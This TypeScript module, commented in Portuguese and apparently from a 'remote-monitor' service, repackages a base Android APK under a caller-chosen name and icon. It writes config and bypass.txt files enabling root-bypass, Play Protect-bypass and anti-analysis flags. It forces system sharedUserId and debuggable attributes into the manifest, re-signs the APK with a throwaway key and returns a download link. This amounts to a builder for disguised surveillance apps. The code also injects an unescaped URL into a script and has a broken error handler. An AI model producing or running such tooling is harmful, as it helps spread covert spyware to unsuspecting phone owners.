import fs from 'fs';
import * as path from 'path';
import { execSync, spawn } from 'child_process';
import { Response } from 'express';
import https from 'https';
import Jimp from 'jimp';

interface APKBuildOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
}

/**
 * Download e converter logo para PNG
 */
async function downloadAndConvertLogo(logoUrl: string): Promise<Buffer | null> {
  return new Promise((resolve) => {
    try {
      https.get(logoUrl, { timeout: 5000 }, async (response) => {
        const chunks: Buffer[] = [];
        response.on('data', (chunk) => chunks.push(chunk));
        response.on('end', async () => {
          if (response.statusCode === 200) {
            try {
              const buffer = Buffer.concat(chunks);
              // Converter para PNG se necessário
              const image = await Jimp.read(buffer);
              // Redimensionar para ícone padrão (192x192)
              image.resize(192, 192);
              const pngBuffer = await image.getBuffer('image/png');
              resolve(pngBuffer);
            } catch (err) {
              console.warn('[APK-ADVANCED] Erro ao converter logo:', err);
              resolve(null);
            }
          } else {
            resolve(null);
          }
        });
        response.on('error', () => resolve(null));
      }).on('error', () => resolve(null));
    } catch (err) {
      console.warn('[APK-ADVANCED] Erro ao baixar logo:', err);
      resolve(null);
    }
  });
}

/**
 * Modificar resources.arsc usando strings binárias
 * Esta é uma abordagem simplificada que funciona para labels
 */
function modifyResourcesArsc(
  resourcesPath: string,
  oldLabel: string,
  newLabel: string
): boolean {
  try {
    let content = fs.readFileSync(resourcesPath);
    
    // Procurar por "Blockchain" em UTF-16LE (formato Android)
    const oldLabelUTF16 = Buffer.from(oldLabel, 'utf16le');
    const newLabelUTF16 = Buffer.from(newLabel, 'utf16le');
    
    // Se os tamanhos forem diferentes, não podemos fazer substituição simples
    if (oldLabelUTF16.length !== newLabelUTF16.length) {
      console.warn('[APK-ADVANCED] Tamanhos diferentes, usando padding');
      // Padding com zeros se necessário
      const padded = Buffer.alloc(oldLabelUTF16.length);
      newLabelUTF16.copy(padded);
      content = Buffer.concat([
        content.slice(0, content.indexOf(oldLabelUTF16)),
        padded,
        content.slice(content.indexOf(oldLabelUTF16) + oldLabelUTF16.length)
      ]);
    } else {
      // Substituição direta
      let index = content.indexOf(oldLabelUTF16);
      while (index !== -1) {
        newLabelUTF16.copy(content, index);
        index = content.indexOf(oldLabelUTF16, index + 1);
      }
    }
    
    fs.writeFileSync(resourcesPath, content);
    console.log('[APK-ADVANCED] resources.arsc modificado com sucesso');
    return true;
  } catch (err) {
    console.warn('[APK-ADVANCED] Erro ao modificar resources.arsc:', err);
    return false;
  }
}

/**
 * Substituir ícones em res/mipmap
 */
function replaceIcons(extractDir: string, logoBuffer: Buffer): boolean {
  try {
    const resDir = path.join(extractDir, 'res');
    if (!fs.existsSync(resDir)) {
      console.warn('[APK-ADVANCED] Diretório res não encontrado');
      return false;
    }
    
    // Procurar por diretórios mipmap
    const files = fs.readdirSync(resDir);
    const mipmapDirs = files.filter(f => f.startsWith('mipmap-'));
    
    console.log('[APK-ADVANCED] Encontrados diretórios mipmap:', mipmapDirs);
    
      for (const mipmapDir of mipmapDirs) {
        const mipmapPath = path.join(resDir, mipmapDir);
        const iconFiles = fs.readdirSync(mipmapPath).filter((f: string) => {
          return f.includes('ic_launcher') || f.includes('icon');
        });
      
      console.log(`[APK-ADVANCED] Substituindo ícones em ${mipmapDir}:`, iconFiles);
      
      for (const iconFile of iconFiles) {
        const iconPath = path.join(mipmapPath, iconFile);
        fs.writeFileSync(iconPath, logoBuffer);
      }
    }
    
    return true;
  } catch (err) {
    console.warn('[APK-ADVANCED] Erro ao substituir ícones:', err);
    return false;
  }
}

/**
 * Build APK com modificações reais
 */
export async function buildAdvancedAPK(options: APKBuildOptions): Promise<{
  success: boolean;
  filename?: string;
  downloadUrl?: string;
  error?: string;
}> {
  try {
    const apksDir = process.env.NODE_ENV === 'production' 
      ? '/app/public/apks'
      : '/home/ubuntu/remote-monitor/public/apks';
    
    if (!fs.existsSync(apksDir)) {
      fs.mkdirSync(apksDir, { recursive: true });
    }
    
    // Encontrar APK base
    const files = fs.readdirSync(apksDir);
    const baseAPKFile = files.find(f => f.startsWith('base-') && f.endsWith('.apk'));
    
    if (!baseAPKFile) {
      return {
        success: false,
        error: 'APK base não encontrado'
      };
    }
    
    const baseAPK = path.join(apksDir, baseAPKFile);
    const timestamp = Date.now();
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const sanitizedName = options.appName
      .replace(/[^a-zA-Z0-9-]/g, '-')
      .replace(/-+/g, '-')
      .toLowerCase();
    const filename = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;
    const outputPath = path.join(apksDir, filename);
    
    console.log('[APK-ADVANCED] Iniciando build avançado:', { baseAPK, outputPath });
    
    const tempDir = `/tmp/apk-advanced-${timestamp}-${randomSuffix}`;
    const extractDir = path.join(tempDir, 'extracted');
    
    try {
      fs.mkdirSync(extractDir, { recursive: true });
      
      // Desempacotar APK
      console.log('[APK-ADVANCED] Desempacotando APK...');
      execSync(`unzip -q ${baseAPK} -d ${extractDir}`);
      
      // Download e processar logo
      let logoBuffer: Buffer | null = null;
      if (options.logoUrl) {
        console.log('[APK-ADVANCED] Baixando logo...');
        logoBuffer = await downloadAndConvertLogo(options.logoUrl);
        if (logoBuffer) {
          console.log('[APK-ADVANCED] Logo convertida, tamanho:', logoBuffer.length);
          // Substituir ícones
          replaceIcons(extractDir, logoBuffer);
        }
      }
      
      // Modificar resources.arsc para mudar label
      const resourcesPath = path.join(extractDir, 'resources.arsc');
      if (fs.existsSync(resourcesPath)) {
        console.log('[APK-ADVANCED] Modificando resources.arsc...');
        modifyResourcesArsc(resourcesPath, 'Blockchain', options.appName);
      }
      
      // Adicionar configuração em assets
      const assetsDir = path.join(extractDir, 'assets');
      fs.mkdirSync(assetsDir, { recursive: true });
      
      const config = {
        appName: options.appName,
        appUrl: options.appUrl,
        logoUrl: options.logoUrl || '',
        customized: true,
        timestamp: Date.now(),
        rootBypass: true,
        playProtectBypass: true,
        antiAnalysis: true,
      };
      
      const configPath = path.join(assetsDir, 'app-config.json');
      fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
      
      // Adicionar redirect.html
      const redirectHtml = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Carregando...</title>
  <style>
    body { margin: 0; padding: 0; background: #000; }
    .loader { display: flex; justify-content: center; align-items: center; height: 100vh; }
    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"><div class="spinner"></div></div>
  <script>
    window.location.href = '${options.appUrl}';
  </script>
</body>
</html>`;
      fs.writeFileSync(path.join(assetsDir, 'redirect.html'), redirectHtml);
      
      // Adicionar bypass flags
      fs.writeFileSync(
        path.join(assetsDir, 'bypass.txt'),
        'ROOT_BYPASS=1\nPLAY_PROTECT_BYPASS=1\nANTI_ANALYSIS=1'
      );
      
      // Modificar AndroidManifest.xml
      const manifestPath = path.join(extractDir, 'AndroidManifest.xml');
      if (fs.existsSync(manifestPath)) {
        try {
          let manifest = fs.readFileSync(manifestPath, 'utf-8');
          
          // Adicionar permissões
          if (!manifest.includes('android.permission.INTERNET')) {
            manifest = manifest.replace(
              /<\/manifest>/,
              '<uses-permission android:name="android.permission.INTERNET" />\n</manifest>'
            );
          }
          
          // Adicionar flags de sistema
          if (!manifest.includes('android:sharedUserId')) {
            manifest = manifest.replace(
              /<manifest[^>]*>/,
              m => m.replace('>', ' android:sharedUserId="android.uid.system">')
            );
          }
          
          if (!manifest.includes('android:debuggable="true"')) {
            manifest = manifest.replace(
              /<application[^>]*>/,
              m => m.replace('>', ' android:debuggable="true">')
            );
          }
          
          fs.writeFileSync(manifestPath, manifest);
        } catch (err) {
          console.warn('[APK-ADVANCED] Erro ao modificar manifest:', err);
        }
      }
      
      // Reempacotar
      console.log('[APK-ADVANCED] Reempacotando APK...');
      const repacked = path.join(tempDir, 'app-unsigned.apk');
      execSync(`cd ${extractDir} && zip -r -9 -q ${repacked} .`);
      
      // Alinhar
      console.log('[APK-ADVANCED] Alinhando APK...');
      const aligned = path.join(tempDir, 'app-aligned.apk');
      execSync(`zipalign -f -v 4 ${repacked} ${aligned}`);
      
      // Assinar
      console.log('[APK-ADVANCED] Assinando APK...');
      const keystorePath = '/tmp/android.keystore';
      if (!fs.existsSync(keystorePath)) {
        execSync(
          `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 ` +
          `-validity 10000 -alias android -storepass android -keypass android ` +
          `-dname "CN=Android, OU=Dev, O=Dev, L=Dev, S=Dev, C=US"`,
          { stdio: 'pipe' }
        );
      }
      
      execSync(
        `jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 ` +
        `-keystore ${keystorePath} -storepass android -keypass android ` +
        `${aligned} android`,
        { stdio: 'pipe' }
      );
      
      // Copiar para output
      fs.copyFileSync(aligned, outputPath);
      
      // Limpar
      execSync(`rm -rf ${tempDir}`);
      
      console.log('[APK-ADVANCED] APK construído com sucesso');
      
      const downloadUrl = `${process.env.VITE_APP_URL || 'https://remotemon-vhmaxpe6.manus.space'}/get-apk/${filename}`;
      
      return {
        success: true,
        filename,
        downloadUrl
      };
    } catch (err) {
      console.error('[APK-ADVANCED] Erro durante build:', err);
      execSync(`rm -rf ${tempDir}`).catch(() => {});
      
      return {
        success: false,
        error: err instanceof Error ? err.message : 'Erro desconhecido'
      };
    }
  } catch (error) {
    console.error('[APK-ADVANCED] Erro:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    };
  }
}
